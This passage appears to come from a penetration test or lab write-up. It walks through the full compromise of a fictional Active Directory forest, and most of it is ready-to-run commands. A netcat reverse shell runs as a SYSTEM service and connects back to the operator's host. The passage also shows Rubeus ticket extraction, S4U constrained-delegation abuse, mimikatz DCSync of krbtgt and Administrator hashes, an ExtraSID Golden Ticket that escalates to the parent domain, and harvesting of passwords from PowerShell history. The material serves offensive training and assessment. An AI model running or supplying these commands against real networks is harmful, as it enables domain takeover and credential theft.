```powershell
# FROM INTERNAL-SRV06
winrm set winrm/config/client '@{TrustedHosts="*"}'
winrs.exe -r:internal-batch.internal.msp.example -u:internalmsp\batchsvc -p:"REDACTED_SECRET" cmd

$sec=ConvertTo-SecureString "REDACTED_SECRET" -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential("internalmsp\batchsvc",$sec)
Enter-PSSession -ComputerName internal-batch.internal.msp.example -Credential $cred
```

## ATTACK CHAIN

`INTERNAL-BATCH$` → Constrained Delegation + `TrustedToAuthForDelegation` → S4U impersonation → LDAP service access on `INTERNAL-DC01` → domain compromised → intra-forest trust abuse → ExtraSID escalation → full compromise of `msp.example`

## EXPLOITATION

### Kerberos Constrained Delegation (KCD) Abuse against the Domain Controller

#### 1. Obtain SYSTEM Execution

Remote execution on `INTERNAL-BATCH` was established and escalated to `NT AUTHORITY\SYSTEM` by creating a malicious service that spawns a reverse shell to the operator's host.

```powershell
# 1. Prepare listener on the attack host (IT-EMPLOYEE15)
.\nc64.exe -lvnp 443

# 2. Create and start a malicious service on the compromised host
cmd /c sc create ada binPath= "cmd /c C:\Windows\Temp\nc64.exe -e cmd 10.200.5.15 443"
sc.exe start ada
```

Result: reverse shell with `SYSTEM` privileges.

#### 2. Extract the Machine Account Ticket

`INTERNAL-BATCH` has KCD configured. The Kerberos material for `INTERNAL-BATCH$` is extracted from the SYSTEM session (`LUID 0x3e7`).

```powershell
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

> This extracts the TGT for the machine account.

#### 3. KCD Abuse via S4U

With the `INTERNAL-BATCH$` ticket, S4U is used to request a service ticket as `Administrator` against the Domain Controller.

```powershell
# Using the extracted machine account ticket
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:http/internal-dc01.internal.msp.example /altservice:ldap /nowrap /ptt /domain:internal.msp.example /ticket:
```

Process:

1. The `INTERNAL-BATCH$` TGT is used to authenticate against Kerberos.
2. A S4U ticket is requested on behalf of `Administrator`.
3. A valid TGS is obtained for the LDAP service on the Domain Controller.
4. The ticket is injected into the current session via `/ptt`.

```powershell
# Alternative: AES key + machine account
.\Rubeus.exe s4u /user:INTERNAL-BATCH$ /domain:internal.msp.example /aes256:REDACTED_SECRET /impersonateuser:Administrator /msdsspn:http/internal-dc01.internal.msp.example /altservice:ldap /ptt
```

| Method | Advantages | Disadvantages | Recommended use |
|---|---|---|---|
| Stolen ticket | No additional credential extraction; no new LSASS dump; lower detection surface; direct S4U/DCSync access | Depends on valid ticket; expires | Targeted, low-noise DCSync |
| AES key (mimikatz) | Reusable; not dependent on in-memory tickets | Requires prior LSASS dump; higher artifact footprint | Persistence and credential reuse |

#### 4. DCSync against the Domain Controller

With a valid LDAP ticket for the DC, DCSync is executed to extract credentials for critical domain accounts.

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:internalmsp\krbtgt" "exit"
# Hash NTLM   : REDACTED_HASH
# aes256_hmac : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:internalmsp\Administrator" "exit"
# Hash NTLM   : REDACTED_HASH
# aes256_hmac : REDACTED_HASH
```

### Golden Ticket and Cross-Domain Escalation via Parent-Child Trust

#### 1. Golden Ticket Creation

Due to the parent-child trust relationship within the forest, the ticket includes a `SIDHistory` entry corresponding to `Enterprise Admins` of the parent domain `msp.example`, extending privileges to that domain.

```powershell
.\Rubeus.exe golden /user:Administrator /id:500 /domain:internal.msp.example /sid:S-1-5-21-2754435719-1041067879-922430489 /groups:513 /sids:S-1-5-21-2998733414-582960673-4099777928-519 /aes256:REDACTED_SECRET /ptt
```

#### 2. Validate Privileges on Both Domain Controllers

```powershell
dir \\internal-dc01.internal.msp.example\C$\
dir \\msp-dc01.msp.example\C$\
```

With the Golden Ticket in memory, administrative SMB shares are accessible on both:
- `internal-dc01.internal.msp.example` (compromised child domain)
- `msp-dc01.msp.example` (parent domain)

#### 3. DCSync against the Parent Domain

```powershell
# Recover NTLM hash for Administrator in the parent domain
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:msp.example /dc:msp-dc01.msp.example /user:msp\administrator" "exit"

# NTLM : REDACTED_HASH
# AES  : REDACTED_HASH
```

#### 4. Legitimate TGT for Parent Domain

With the parent domain Administrator hash, a legitimate TGT is requested to operate in `msp.example` without relying on the forged Golden Ticket.

```powershell
# Request a legitimate TGT for Administrator in msp.example
.\Rubeus.exe asktgt /user:administrator /domain:msp.example /ntlm:REDACTED_SECRET /ptt

# Remote access to the parent domain controller
winrs.exe -r:msp-dc01.msp.example cmd
```

#### 5. Credential Hunting on the Domain Controller

Traditional enumeration on a DC yields limited incremental value. The focus shifts to identifying reusable credentials — credentials stored in memory, system secrets, or operational artifacts left by administrators.

```powershell
# Inspect PowerShell history for operational artifacts
Get-Content C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
# $objectivePart1 = REDACTED_OBJECTIVE "REDACTED_SECRET" -AsPlainText -Force
```

The administrator stored a password directly in PowerShell history — likely associated with an administrative process, recovery mechanism (`escrow`), or secret management workflow within the infrastructure.
